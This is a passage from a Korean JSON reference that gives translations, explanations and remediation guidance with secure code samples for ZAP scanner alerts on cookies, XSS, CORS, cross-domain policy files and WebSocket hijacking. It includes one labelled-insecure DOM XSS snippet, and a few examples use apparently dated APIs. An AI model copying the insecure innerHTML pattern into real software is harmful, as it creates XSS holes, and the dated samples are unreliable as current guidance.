      "**HttpOnly 및 Secure 플래그 사용:** `HttpOnly` 플래그는 XSS 공격으로부터 쿠키 탈취를 막고, `Secure` 플래그는 HTTPS를 통해서만 쿠키가 전송되도록 보장하여 중간자 공격을 방지합니다.",
      "**세션 관리 강화:** 서버 측 세션 관리를 사용하여 세션 ID의 예측 불가능성, 충분한 길이, 적절한 만료 시간을 보장합니다.",
      "**입력값 유효성 검사:** 쿠키 값을 서버 측에서 사용할 때, 이를 신뢰할 수 없는 입력으로 간주하고 철저히 유효성 검사 및 살균(sanitization)을 수행합니다."
    ],
    "example_secure_cookie_framework": "# 대부분의 웹 프레임워크는 안전한 세션 관리와 쿠키 서명을 기본적으로 제공합니다.\n# Spring Framework (Java) 예시: Spring Security 세션 관리\n# Spring Security는 세션 관리와 CSRF 보호를 기본적으로 제공하며, 세션 쿠키에 HttpOnly와 Secure 플래그를 자동으로 설정합니다.\n# 별도의 설정을 변경하지 않는 한 안전하게 처리됩니다.\n\n# Django (Python) 예시:\n# Django는 CSRF 토큰을 쿠키에 저장할 때 HttpOnly 플래그를 사용하고, 세션 쿠키는 기본적으로 안전하게 관리됩니다.\n# settings.py에서 SESSION_COOKIE_SECURE = True 및 CSRF_COOKIE_SECURE = True를 설정하여 HTTPS 환경에서만 쿠키가 전송되도록 합니다.\n# settings.py\nSESSION_COOKIE_SECURE = True\nCSRF_COOKIE_SECURE = True\nSESSION_COOKIE_HTTPONLY = True\nCSRF_COOKIE_HTTPONLY = True\n\n# Node.js (Express.js) with `express-session` and `cookie-parser`\nconst express = require('express');\nconst session = require('express-session');\nconst cookieParser = require('cookie-parser');\n\nconst app = express();\napp.use(cookieParser());\n\napp.use(session({\n    secret: 'your_secret_key_for_signing_session_id', // 세션 ID 서명에 사용되는 비밀 키 (매우 중요)\n    resave: false,\n    saveUninitialized: false,\n    cookie: {\n        httpOnly: true, // HttpOnly 플래그\n        secure: true,   // HTTPS 전용\n        maxAge: 3600000, // 세션 만료 시간 (밀리초)\n        sameSite: 'Lax' // SameSite 정책\n    }\n}));"
  },
  "Cookie Set Without HttpOnly Flag": {
    "translated": "HttpOnly 플래그 없이 설정된 쿠키 – JavaScript를 통해 쿠키에 접근 가능하여 세션 탈취에 취약할 수 있음",
    "description": "`Cookie No HttpOnly Flag`와 동일한 취약점입니다. 쿠키가 `HttpOnly` 플래그 없이 설정되어 있어 클라이언트 측 JavaScript가 해당 쿠키에 접근할 수 있게 되며, XSS (Cross-Site Scripting) 공격 시 세션 탈취 등의 위험이 증가합니다.",
    "solution_guidelines": [
      "**모든 세션 쿠키에 `HttpOnly` 플래그 설정:** 사용자 세션 ID, 인증 토큰, CSRF 토큰 등 민감한 정보를 담는 모든 쿠키에 `HttpOnly` 플래그를 설정합니다. 이는 JavaScript가 해당 쿠키에 접근하는 것을 막아 XSS 공격으로 인한 쿠키 탈취 위험을 줄입니다.",
      "**클라이언트 측 스크립트에서 접근할 필요 없는 쿠키에 적용:** `HttpOnly` 플래그는 JavaScript에서 읽거나 수정할 필요가 없는 쿠키(예: 세션 쿠키, CSRF 토큰 쿠키)에 적용되어야 합니다. 클라이언트 측 스크립트에서 명시적으로 접근해야 하는 쿠키(예: 웹 분석, UI 상태)에는 적용할 수 없으므로, 이러한 쿠키에는 민감 정보가 포함되지 않도록 주의해야 합니다.",
      "**웹 서버 및 애플리케이션 프레임워크 설정 활용:** 대부분의 웹 서버와 애플리케이션 프레임워크는 쿠키 설정 시 `HttpOnly` 플래그를 쉽게 설정할 수 있도록 지원합니다. 해당 설정을 활성화하고, 특히 세션 관리 관련 설정에서 기본값이 `HttpOnly`인지 확인합니다.",
      "**`Secure` 플래그와 함께 사용:** 쿠키가 HTTPS를 통해서만 전송되도록 `Secure` 플래그도 함께 설정하여 중간자 공격(Man-in-the-Middle)을 방지합니다."
    ],
    "example_set_http_only_cookie": "# Node.js (Express.js) 예시\napp.get('/set-secure-cookie', (req, res) => {\n    res.cookie('secureSessionId', 'a_secure_session_token', {\n        httpOnly: true,   // JavaScript 접근 방지\n        secure: true,     // HTTPS 전용 (운영 환경 필수)\n        sameSite: 'Lax',  // CSRF 완화\n        maxAge: 3600000   // 1시간 유효 (밀리초)\n    });\n    res.send('Secure cookie set.');\n});\n\n# Java (Spring Boot application.properties)\n# server.servlet.session.cookie.http-only=true\n# server.servlet.session.cookie.secure=true\n\n# Java (Servlet filter 또는 WebMvcConfigurer)\nimport javax.servlet.Filter;\nimport javax.servlet.FilterChain;\nimport javax.servlet.FilterConfig;\nimport javax.servlet.ServletException;\nimport javax.servlet.ServletRequest;\nimport javax.servlet.ServletResponse;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpServletResponseWrapper;\nimport java.io.IOException;\n\n// 이 필터는 응답에서 Set-Cookie 헤더를 가로채 HttpOnly와 Secure 플래그를 추가하는 예시입니다.\n// 실제 프레임워크에서는 내장된 설정을 사용하는 것이 더 좋습니다.\n// @Component\n// public class HttpOnlySecureCookieFilter implements Filter {\n//\n//     @Override\n//     public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)\n//             throws IOException, ServletException {\n//         HttpServletResponse httpResponse = (HttpServletResponse) response;\n//         HttpServletResponseWrapper responseWrapper = new HttpServletResponseWrapper(httpResponse) {\n//             @Override\n//             public void addHeader(String name, String value) {\n//                 if (name.equalsIgnoreCase(\"Set-Cookie\")) {\n//                     // HttpOnly; Secure; SameSite=Lax (예시)\n//                     String newValue = value;\n//                     if (!newValue.toLowerCase().contains(\"httponly\")) {\n//                         newValue += \"; HttpOnly\";\n//                     }\n//                     if (!newValue.toLowerCase().contains(\"secure\")) {\n//                         newValue += \"; Secure\";\n//                     }\n//                     // Consider adding SameSite=Lax if not already present\n//                     if (!newValue.toLowerCase().contains(\"samesite\")) {\n//                         newValue += \"; SameSite=Lax\";\n//                     }\n//                     super.addHeader(name, newValue);\n//                 } else {\n//                     super.addHeader(name, value);\n//                 }\n//             }\n//         };\n//         chain.doFilter(request, responseWrapper);\n//     }\n//     @Override\n//     public void init(FilterConfig filterConfig) throws ServletException {}\n//     @Override\n//     public void destroy() {}\n// }"
  },
  "Cookie Slack Detector": {
    "translated": "쿠키 슬랙 감지 – 쿠키의 크기나 내용에 불필요한 정보가 포함될 수 있는지 점검",
    "description": "쿠키에 불필요하거나 민감한 정보가 포함되어 있거나, 쿠키의 크기가 비정상적으로 커서 성능 저하나 정보 노출의 위험이 있는 취약점입니다.",
    "solution_guidelines": [
      "**쿠키에 민감 정보 저장 금지:** 쿠키에는 절대 개인 식별 정보(PII), 세션 토큰, 비밀번호 등 민감한 정보를 직접 저장해서는 안 됩니다. 민감 정보는 서버 측 세션에 저장하고, 쿠키에는 세션 ID만 저장합니다.",
      "**쿠키 크기 최소화:** 쿠키에 저장되는 데이터의 양을 최소화하여 성능 저하를 방지하고, 불필요한 정보 노출을 막습니다.",
      "**필요한 쿠키만 사용:** 애플리케이션에 반드시 필요한 쿠키만 사용하고, 만료된 쿠키나 불필요한 쿠키는 제거합니다.",
      "**서버 측 세션 관리 적극 활용:** 쿠키를 통해 클라이언트에 저장되는 데이터의 양을 줄이기 위해 서버 측 세션 관리를 적극적으로 활용합니다."
    ],
    "example_general": "# 일반적인 쿠키 사용 원칙\n# 민감 정보는 서버에 저장하고, 세션 ID만 쿠키에 저장\nSet-Cookie: sessionId=a1b2c3d4e5f6; HttpOnly; Secure; SameSite=Lax; Path=/"
  },
  "Cookie Without Secure Flag": {
    "translated": "Secure 플래그 없는 쿠키 – HTTPS가 아닌 HTTP 통신에서도 전송되어 정보 유출에 취약할 수 있음",
    "description": "HTTPS 연결을 통해서만 전송되어야 할 쿠키가 'Secure' 플래그가 설정되지 않아 HTTP 연결을 통해 전송될 수 있어 중간자 공격(Man-in-the-Middle)에 의해 탈취될 위험이 있는 취약점입니다.",
    "solution_guidelines": [
      "**'Secure' 플래그 필수 설정:** 민감한 정보(세션 ID, 인증 토큰 등)를 포함하는 모든 쿠키에는 반드시 'Secure' 플래그를 설정하여 HTTPS 연결에서만 전송되도록 합니다.",
      "**모든 페이지에 HTTPS 강제 적용:** 웹사이트의 모든 페이지에 대해 HTTPS를 강제하여 HTTP 연결 자체가 발생하지 않도록 합니다."
    ],
    "example_express_js": "// Node.js Express 프레임워크 예시\nres.cookie('sessionId', 'your_session_id', {\n  secure: true,   // Secure 플래그 설정\n  httpOnly: true, // HttpOnly 플래K그 설정 (보안 강화)\n  sameSite: 'Lax' // SameSite 플래그 설정 (CSRF 방어)\n});",
    "example_java_servlet": "// Java Servlet 예시\nCookie sessionCookie = new Cookie(\"sessionId\", \"your_session_id\");\nsessionCookie.setSecure(true);   // Secure 플래그 설정\nsessionCookie.setHttpOnly(true); // HttpOnly 플래그 설정\nsessionCookie.setPath(\"/\");\nresponse.addCookie(sessionCookie);"
  },
  "Cookie with Invalid SameSite Attribute": {
    "translated": "잘못된 SameSite 속성 값을 가진 쿠키 – CSRF 공격 방어에 취약할 수 있음",
    "description": "SameSite 쿠키 속성이 유효하지 않게 설정되어 있거나, 브라우저가 인식하지 못하는 값을 가지고 있어 SameSite 보호 메커니즘이 제대로 동작하지 않을 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**올바른 SameSite 속성 값 사용:** SameSite 속성은 'Lax', 'Strict', 'None' 중 하나로 정확하게 설정해야 합니다. 오타나 유효하지 않은 값은 브라우저가 속성을 무시하게 만들 수 있습니다.",
      "**'SameSite=None' 사용 시 'Secure' 필수:** 'SameSite=None'을 사용하는 경우, 반드시 'Secure' 플래그도 함께 설정하여 HTTPS 환경에서만 쿠키가 전송되도록 해야 합니다."
    ],
    "example_php": "// PHP 예시\nsetcookie('myCookie', 'myValue', [\n    'samesite' => 'Lax', // 올바른 값: Lax, Strict, None\n    'secure' => true,    // SameSite=None 인 경우 필수\n    'httponly' => true\n]);"
  },
  "Cookie with SameSite Attribute None": {
    "translated": "SameSite 속성 'None'을 가진 쿠키 – 다른 도메인 요청에도 전송되어 CSRF에 취약할 수 있음",
    "description": "SameSite 쿠키 속성이 'None'으로 설정되어 있어 다른 도메인의 요청에도 쿠키가 전송되므로, CSRF (Cross-Site Request Forgery) 공격에 취약해질 수 있는 취약점입니다. 이 설정은 크로스 사이트 요청을 허용할 때만 신중하게 사용되어야 합니다.",
    "solution_guidelines": [
      "**'SameSite=None' 사용 시 'Secure' 플래그 필수:** 'SameSite=None'을 설정하는 경우, 반드시 'Secure' 플래그를 함께 설정하여 HTTPS 환경에서만 쿠키가 전송되도록 합니다. 이는 브라우저의 요구 사항이기도 합니다.",
      "**CSRF 토큰 사용:** 'SameSite=None'을 사용해야 하는 경우 (예: 서드파티 위젯, iframe), CSRF 토큰과 같은 추가적인 CSRF 방어 메커니즘을 반드시 구현해야 합니다.",
      "**'Lax' 또는 'Strict' 우선 고려:** 특별한 이유가 없다면 'Lax' 또는 'Strict'를 사용하여 CSRF 공격으로부터 보호하는 것이 좋습니다. 'None'은 신중하게 선택해야 합니다."
    ],
    "example_django": "# Django settings.py 예시 (세션 쿠키에 적용)\nSESSION_COOKIE_SAMESITE = 'Lax' # 기본적으로 'Lax' 또는 'Strict' 권장\n\n# 특정 쿠키에 SameSite=None을 적용해야 하는 경우 (신중하게 사용)\n# 응답 객체에 직접 설정:\n# response.set_cookie('cross_site_cookie', 'value', samesite='None', secure=True, httponly=True)"
  },
  "Cookie without SameSite Attribute": {
    "translated": "SameSite 속성 없는 쿠키 – CSRF 방어에 명시적인 SameSite 설정이 필요함",
    "description": "쿠키에 'SameSite' 속성이 설정되지 않아 브라우저의 기본 정책(대부분 'Lax'로 동작)에 의존하게 됩니다. 명시적인 설정이 없어 보안 의도가 불분명하고, 구형 브라우저에서는 CSRF 보호가 적용되지 않을 수 있습니다.",
    "solution_guidelines": [
      "**'SameSite' 속성 명시적 설정:** 모든 쿠키에 'SameSite' 속성을 'Lax', 'Strict' 또는 'None' 중 하나로 명시적으로 설정하여 브라우저의 기본 동작에 의존하지 않도록 합니다.",
      "**'Lax' 또는 'Strict' 권장:** 대부분의 경우 'Lax' 또는 'Strict'를 사용하여 CSRF 공격으로부터 애플리케이션을 보호하는 것이 좋습니다. 세션 쿠키 등 중요한 쿠키에는 'Lax'가 적합합니다.",
      "**'SameSite=None' 사용 시 'Secure' 플래그 필수:** 'SameSite=None'을 사용해야 한다면, 반드시 'Secure' 플래그를 함께 설정합니다."
    ],
    "example_spring_boot": "// Spring Boot (Java) 예시 - Set-Cookie 헤더\n// application.properties 또는 application.yml\n# server.servlet.session.cookie.same-site=Lax\n\n// 특정 응답 쿠키 설정\n// ResponseCookie.from(\"myCookie\", \"myValue\")\n//     .sameSite(\"Lax\") // 명시적 설정\n//     .secure(true)\n//     .httpOnly(true)\n//     .build();"
  },
  "Cross Site Scripting (DOM Based)": {
    "translated": "크로스 사이트 스크립팅 (DOM 기반) – 브라우저 DOM을 조작하여 악성 스크립트를 실행하는 공격",
    "description": "클라이언트 측 스크립트가 사용자 입력값을 DOM(Document Object Model)에 안전하게 처리하지 않고 직접 삽입하여, 악성 스크립트가 사용자의 브라우저에서 실행될 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**사용자 입력값 출력 시 인코딩:** `innerHTML`, `document.write()`, `jQuery.html()` 등 DOM 조작 함수를 사용하여 사용자 입력을 HTML에 삽입할 때, 반드시 HTML 엔티티 인코딩을 수행하여 스크립트가 아닌 일반 텍스트로 해석되도록 합니다.",
      "**`textContent` 또는 `innerText` 사용 권장:** HTML 콘텐츠가 아닌 일반 텍스트를 삽입할 때는 `element.textContent` 또는 `element.innerText` 속성을 사용하여 브라우저가 자동으로 인코딩하도록 합니다.",
      "**`eval()` 및 `setTimeout(string)` 등 위험한 함수 사용 자제:** 문자열을 코드로 실행하는 `eval()`, `setTimeout(string)`, `setInterval(string)` 등의 사용을 피하고, 대신 함수 참조나 익명 함수를 사용합니다.",
      "**콘텐츠 보안 정책 (Content Security Policy - CSP) 구현:** `script-src` 지시어를 사용하여 스크립트 로드를 허용하는 원본을 제한하고, `unsafe-inline` 사용을 피하여 인라인 스크립트 실행을 막습니다."
    ],
    "example_javascript_secure": "// Insecure (DOM-based XSS vulnerable)\n// const userInput = new URLSearchParams(window.location.search).get('data');\n// document.getElementById('output').innerHTML = userInput;\n\n// Secure (using textContent for plain text)\nconst userInput = new URLSearchParams(window.location.search).get('data');\nif (userInput) {\n    document.getElementById('output').textContent = userInput;\n}\n\n// Secure (sanitizing HTML input if necessary, usually done server-side or with a trusted library)\n// const cleanHtml = DOMPurify.sanitize(userInput);\n// document.getElementById('output').innerHTML = cleanHtml;"
  },
  "Cross Site Scripting (Persistent)": {
    "translated": "크로스 사이트 스크립팅 (지속성) – 악성 스크립트가 서버에 저장되어 다른 사용자에게도 계속 영향을 미치는 공격",
    "description": "공격자가 악성 스크립트를 서버에 저장하고, 저장된 스크립트가 다른 사용자에게 제공될 때 사용자의 브라우저에서 실행되는 취약점입니다. 게시판 글, 댓글, 프로필 정보 등 사용자 입력이 데이터베이스에 저장되는 경우 발생하기 쉽습니다.",
    "solution_guidelines": [
      "**모든 사용자 입력값 서버 측에서 철저히 검증 및 필터링:** 예상되는 데이터 형식과 범위에 맞게 입력값을 엄격하게 검증하고, 허용되지 않는 문자나 태그(예: `<script>`, `<iframe>`, `onerror` 속성 등)는 제거하거나 HTML 엔티티로 변환합니다.",
      "**사용자 입력값 출력 시 인코딩:** 데이터베이스에서 불러온 사용자 입력을 HTML 페이지에 출력하기 전에 항상 적절히 HTML 엔티티 인코딩을 수행하여 브라우저가 스크립트가 아닌 일반 텍스트로 해석하도록 합니다.",
      "**콘텐츠 보안 정책 (Content Security Policy - CSP) 구현:** `script-src` 지시어를 사용하여 스크립트 로드를 허용하는 원본을 제한하고, `unsafe-inline` 및 `unsafe-eval` 사용을 피하여 인라인 스크립트 및 `eval()` 실행을 막습니다.",
      "**보안 라이브러리 사용:** OWASP ESAPI, DOMPurify (클라이언트 측에서) 등 검증된 보안 라이브러리를 사용하여 XSS 방어 기능을 구현합니다."
    ],
    "example_php_secure": "// PHP 서버 측 예시 (입력 필터링 및 출력 인코딩)\n\n// 데이터 저장 시 (Input Filtering / Sanitization)\n$userInput = $_POST['comment'];\n// HTMLPurifier, htmLawed 또는 사용자 정의 화이트리스트 기반 필터링 사용 권장\n// 예시: 기본적인 태그 제거 (이것만으로는 불충분)\n$sanitizedInput = strip_tags($userInput, '<b><i><em><strong><a>');\n// 데이터베이스에 $sanitizedInput 저장\n\n// 데이터 출력 시 (Output Encoding)\n$dbContent = get_comment_from_db(); // 데이터베이스에서 댓글 가져오기\necho htmlspecialchars($dbContent, ENT_QUOTES, 'UTF-8'); // HTML 엔티티 인코딩"
  },
  "Cross Site Scripting (Persistent) - Prime": {
    "translated": "크로스 사이트 스크립팅 (지속성) - 첫 발견 – 지속성 XSS의 초기 발견 시점",
    "description": "지속적 XSS 취약점의 변형으로, 특정 조건(예: 스파이더링 과정에서 발견된 특정 페이지, 관리자 페이지 등)에서 발견된 XSS 취약점을 강조하는 ZAP의 알림입니다. 근본적인 원인과 해결책은 일반적인 지속적 XSS와 동일합니다.",
    "solution_guidelines": [
      "**Cross Site Scripting (Persistent)** 취약점의 해결 가이드라인을 참조하십시오.",
      "특히, 관리자 페이지나 잘 접근되지 않는 페이지에서의 입력값 처리에도 동일한 보안 검증 및 인코딩 절차를 적용해야 합니다."
    ]
  },
  "Cross Site Scripting (Persistent) - Spider": {
    "translated": "크로스 사이트 스크립팅 (지속성) - 스파이더 발견 – 크롤러(Spider)에 의해 지속성 XSS가 발견됨",
    "description": "스파이더링 과정에서 발견된 지속적 XSS 취약점을 나타내는 ZAP의 알림입니다. 이는 웹 스파이더가 탐색하는 과정에서 특정 입력 필드에 악성 스크립트가 삽입되어 저장될 수 있음을 의미합니다. 근본적인 원인과 해결책은 일반적인 지속적 XSS와 동일합니다.",
    "solution_guidelines": [
      "**Cross Site Scripting (Persistent)** 취약점의 해결 가이드라인을 참조하십시오.",
      "특히, 스파이더가 접근 가능한 모든 입력 필드에 대해 강력한 입력값 검증과 출력 인코딩을 적용해야 합니다."
    ]
  },
  "Cross Site Scripting (Reflected)": {
    "translated": "크로스 사이트 스크립팅 (반사) – 사용자 입력이 웹 페이지에 바로 반영되어 악성 스크립트를 실행하는 공격",
    "description": "사용자로부터 입력받은 스크립트가 서버를 거쳐 응답 페이지에 즉시 반영되어 사용자의 브라우저에서 실행되는 취약점입니다. 주로 URL 파라미터, HTTP 헤더 등을 통해 전달된 악성 스크립트가 바로 응답에 포함될 때 발생합니다.",
    "solution_guidelines": [
      "**모든 사용자 입력값 출력 시 인코딩:** URL 파라미터, HTTP 헤더, 폼 데이터 등 모든 사용자 입력값을 웹 페이지에 출력하기 전에 반드시 HTML 엔티티 인코딩을 수행하여 스크립트가 아닌 일반 텍스트로 해석되도록 합니다.",
      "**콘텐츠 보안 정책 (Content Security Policy - CSP) 구현:** `script-src` 지시어를 사용하여 스크립트 로드를 허용하는 원본을 제한하고, `unsafe-inline` 및 `unsafe-eval` 사용을 피하여 인라인 스크립트 및 `eval()` 실행을 막습니다.",
      "**입력값 유효성 검사 (Input Validation):** 서버 측에서 예상되는 형식과 범위에 맞게 입력값을 엄격하게 검증하여 악성 스크립트 주입을 사전에 차단합니다.",
      "**X-XSS-Protection 헤더 사용:** (최신 브라우저에서는 CSP가 더 권장되지만) `X-XSS-Protection: 1; mode=block` 헤더를 사용하여 브라우저 내장 XSS 필터를 활성화합니다."
    ],
    "example_python_flask_secure": "# Python Flask 예시 (Reflected XSS 방어)\nfrom flask import Flask, request, escape\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    query = request.args.get('q', '')\n    # 안전한 출력: escape() 함수를 사용하여 HTML 엔티티 인코딩\n    return f\"<h1>Search results for: {escape(query)}</h1>\"\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  "Cross-Domain JavaScript Source File Inclusion": {
    "translated": "크로스-도메인 JavaScript 소스 파일 포함 – 다른 도메인의 JS 파일을 가져와 사용하며, 해당 도메인 침해 시 영향을 받을 수 있음",
    "description": "다른 도메인에 있는 JavaScript 파일을 `<script src=\"...\">` 태그를 통해 포함할 때, 해당 외부 스크립트가 악의적이거나 조작되었을 경우 웹 애플리케이션의 보안에 영향을 미칠 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**불필요한 외부 스크립트 포함 자제:** 신뢰할 수 없고 검증되지 않은 외부 도메인의 스크립트 파일은 가능한 한 포함하지 않습니다.",
      "**서브리소스 무결성(SRI) 사용:** 외부 스크립트를 포함할 때는 `integrity` 속성을 사용하여 해당 스크립트 파일의 해시값을 명시하고, 브라우저가 로드 전에 이 해시값을 검증하도록 합니다. 이는 CDN 등 외부에서 스크립트가 변조되는 것을 방지합니다.",
      "**콘텐츠 보안 정책 (Content Security Policy - CSP) 사용:** `script-src` 지시어를 사용하여 스크립트를 로드할 수 있는 허용된 도메인(화이트리스트)을 명시적으로 지정합니다. 이를 통해 신뢰할 수 없는 외부 스크립트 로드를 차단합니다."
    ],
    "example_html_sri": "<script src=\"https://example.com/external.js\"\n        integrity=\"sha384-abcdef1234567890...\"\n        crossorigin=\"anonymous\"></script>"
  },
  "Cross-Domain Misconfiguration": {
    "translated": "크로스-도메인 설정 오류 – 다른 도메인과의 리소스 공유 정책이 잘못되어 보안 문제가 발생할 수 있음",
    "description": "웹 서버나 애플리케이션의 CORS(Cross-Origin Resource Sharing) 설정이 잘못되어, 신뢰할 수 없는 외부 도메인에서 민감한 리소스에 접근하거나 데이터에 대한 요청을 보낼 수 있도록 허용하는 취약점입니다.",
    "solution_guidelines": [
      "**CORS (Cross-Origin Resource Sharing) 설정 엄격화:** `Access-Control-Allow-Origin` 헤더를 특정 허용된 도메인으로만 제한하거나, 필요한 경우가 아니라면 와일드카드(`*`) 사용을 지양합니다.",
      "**필요한 HTTP 메서드만 허용:** `Access-Control-Allow-Methods` 헤더를 통해 허용되는 HTTP 메서드를 `GET`, `POST` 등 필요한 것만으로 제한합니다.",
      "**민감한 헤더 및 자격 증명 제한:** `Access-Control-Allow-Headers` 및 `Access-Control-Allow-Credentials` 설정 시, 불필요한 헤더나 자격 증명(쿠키, HTTP 인증)의 전송을 허용하지 않도록 주의합니다.",
      "**서버 측에서 출처 검증:** 클라이언트에서 보내는 `Origin` 헤더를 서버 측에서 검증하여, 허용된 출처의 요청만 처리하도록 합니다."
    ],
    "example_nginx_cors": "# Nginx CORS 설정 예시 (특정 도메인만 허용)\nserver {\n    # ...\n    location /api/data {\n        if ($request_method = 'OPTIONS') {\n            add_header 'Access-Control-Allow-Origin' 'https://www.your-trusted-domain.com';\n            add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS';\n            add_header 'Access-Control-Allow-Headers' 'DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range,Authorization';\n            add_header 'Access-Control-Allow-Credentials' 'true';\n            add_header 'Access-Control-Max-Age' 1728000;\n            add_header 'Content-Type' 'text/plain; charset=utf-8';\n            add_header 'Content-Length' 0;\n            return 204;\n        }\n        add_header 'Access-Control-Allow-Origin' 'https://www.your-trusted-domain.com';\n        add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS';\n        add_header 'Access-Control-Allow-Headers' 'DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range,Authorization';\n        add_header 'Access-Control-Allow-Credentials' 'true';\n        # ... proxy_pass 또는 fastcgi_pass ...\n    }\n}"
  },
  "Cross-Domain Misconfiguration - Adobe - Read": {
    "translated": "크로스-도메인 설정 오류 - Adobe (읽기) – Adobe 관련 크로스-도메인 정책이 읽기 권한에 대해 허술함",
    "description": "Adobe Flash의 `crossdomain.xml` 파일 설정이 잘못되어 외부 도메인에서 Flash 애플리케이션의 리소스에 대한 읽기 접근을 허용하는 취약점입니다. 이는 민감한 데이터의 유출로 이어질 수 있습니다.",
    "solution_guidelines": [
      "**`crossdomain.xml` 파일 엄격하게 설정:** `allow-access-from` 태그의 `domain` 속성을 특정 신뢰할 수 있는 도메인으로만 제한하고, 와일드카드(`*`) 사용을 지양합니다.",
      "**정책 파일의 최소 권한:** Flash 애플리케이션이 필요로 하는 최소한의 도메인에만 접근을 허용합니다.",
      "**불필요한 정책 파일 제거:** 더 이상 Flash 애플리케이션을 사용하지 않는다면 `crossdomain.xml` 파일을 서버에서 제거합니다."
    ],
    "example_crossdomain_xml_secure": "<?xml version=\"1.0\"?>\n<cross-domain-policy>\n  <allow-access-from domain=\"https://www.your-trusted-domain.com\" />\n  <allow-access-from domain=\"https://sub.your-trusted-domain.com\" />\n</cross-domain-policy>"
  },
  "Cross-Domain Misconfiguration - Adobe - Send": {
    "translated": "크로스-도메인 설정 오류 - Adobe (전송) – Adobe 관련 크로스-도메인 정책이 데이터 전송 권한에 대해 허술함",
    "description": "Adobe Flash의 `crossdomain.xml` 파일 설정이 잘못되어 외부 도메인에서 Flash 애플리케이션으로 데이터 전송을 허용하는 취약점입니다. 이는 데이터 변조 또는 불법적인 요청 발생으로 이어질 수 있습니다.",
    "solution_guidelines": [
      "**`crossdomain.xml` 파일 엄격하게 설정:** `allow-http-request-headers-from` 태그의 `domain` 속성을 특정 신뢰할 수 있는 도메인으로만 제한하고, 와일드카드(`*`) 사용을 지양합니다.",
      "**정책 파일의 최소 권한:** Flash 애플리케이션이 필요로 하는 최소한의 도메인에만 데이터 전송을 허용합니다.",
      "**불필요한 정책 파일 제거:** 더 이상 Flash 애플리케이션을 사용하지 않는다면 `crossdomain.xml` 파일을 서버에서 제거합니다."
    ],
    "example_crossdomain_xml_secure_send": "<?xml version=\"1.0\"?>\n<cross-domain-policy>\n  <allow-access-from domain=\"https://www.your-trusted-domain.com\" />\n  <allow-http-request-headers-from domain=\"https://www.your-trusted-domain.com\" headers=\"Content-Type,Authorization\" />\n</cross-domain-policy>"
  },
  "Cross-Domain Misconfiguration - Silverlight": {
    "translated": "크로스-도메인 설정 오류 - Silverlight – Silverlight 관련 크로스-도메인 정책이 허술함",
    "description": "Microsoft Silverlight 애플리케이션의 `clientaccesspolicy.xml` 파일 설정이 잘못되어 외부 도메인에서 Silverlight 애플리케이션의 리소스에 접근할 수 있도록 허용하는 취약점입니다. 이는 민감한 데이터의 유출로 이어질 수 있습니다.",
    "solution_guidelines": [
      "**`clientaccesspolicy.xml` 파일 엄격하게 설정:** `allow-from` 태그의 `uri` 속성을 특정 신뢰할 수 있는 도메인으로만 제한하고, 와일드카드(`*`) 사용을 지양합니다.",
      "**정책 파일의 최소 권한:** Silverlight 애플리케이션이 필요로 하는 최소한의 도메인에만 접근을 허용합니다.",
      "**불필요한 정책 파일 제거:** 더 이상 Silverlight 애플리케이션을 사용하지 않는다면 `clientaccesspolicy.xml` 파일을 서버에서 제거합니다."
    ],
    "example_clientaccesspolicy_xml_secure": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<access-policy>\n  <cross-domain-access>\n    <policy>\n      <allow-from http-methods=\"*\" http-request-headers=\"*\">\n        <domain uri=\"https://www.your-trusted-domain.com\" />\n      </allow-from>\n      <grant-to>\n        <resource path=\"/\" include-subpaths=\"true\"/>\n      </grant-to>\n    </policy>\n  </cross-domain-access>\n</access-policy>"
  },
  "Cross-Site WebSocket Hijacking": {
    "translated": "크로스-사이트 웹소켓 하이재킹 – 웹소켓 통신이 가로채이거나 조작될 수 있음",
    "description": "WebSocket 연결이 CSRF (Cross-Site Request Forgery) 공격에 취약하여, 공격자가 사용자 모르게 악의적인 WebSocket 메시지를 전송하거나 민감한 정보를 탈취할 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**Origin 헤더 검증:** WebSocket 서버에서 `Origin` HTTP 헤더를 검증하여 허용된 도메인에서 온 연결만 수락합니다.",
      "**인증 및 권한 부여:** WebSocket 연결 시에도 사용자 인증 및 권한 부여 절차를 수행하며, 민감한 작업을 수행하는 WebSocket 메시지에 대해서는 추가적인 인증(예: 일회용 토큰)을 요구합니다.",
      "**세션 쿠키 사용 제한:** WebSocket 연결에 직접적으로 세션 쿠키를 의존하는 것을 피하고, 토큰 기반 인증(예: JWT)을 활용합니다.",
      "**CSRF 토큰 사용:** WebSocket 연결이 초기 HTTP 핸드셰이크를 통해 이루어질 때, CSRF 토큰을 사용하여 요청의 유효성을 검증합니다. (예: `Sec-WebSocket-Protocol` 헤더나 사용자 정의 헤더에 토큰 포함)"
    ],
    "example_nodejs_websocket_secure": "// Node.js WebSocket 서버 예시 (ws 라이브러리)\nconst WebSocket = require('ws');\nconst wss = new WebSocket.Server({ port: 8080 });\n\nwss.on('connection', ws => {\n  const origin = ws.upgradeReq.headers.origin; // Origin 헤더 검증\n  if (origin && !['https://your-trusted-domain.com'].includes(origin)) {\n    console.log(`Connection rejected from untrusted origin: ${origin}`);\n    ws.close(1008, 'Untrusted origin');\n    return;\n  }\n\n  // 이후 인증 및 권한 부여 로직 추가\n  // ws.on('message', message => { ... });\n})"
  },
  "Dangerous JS Functions": {
    "translated": "위험한 JavaScript 함수 사용 – eval(), setTimeout() 등 보안에 취약한 JS 함수가 사용됨",
    "description": "`eval()`, `setTimeout(string)`, `setInterval(string)`, `new Function()` 등과 같이 문자열을 코드로 실행하는 JavaScript 함수들을 사용하여 잠재적으로 코드 인젝션 공격에 취약해질 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**위험한 함수 사용 자제:** `eval()` 및 유사 함수 사용을 가능한 한 피합니다. 대부분의 경우, 이러한 함수 대신 더 안전하고 명확한 대안(예: JSON.parse(), 함수 참조)이 있습니다.",
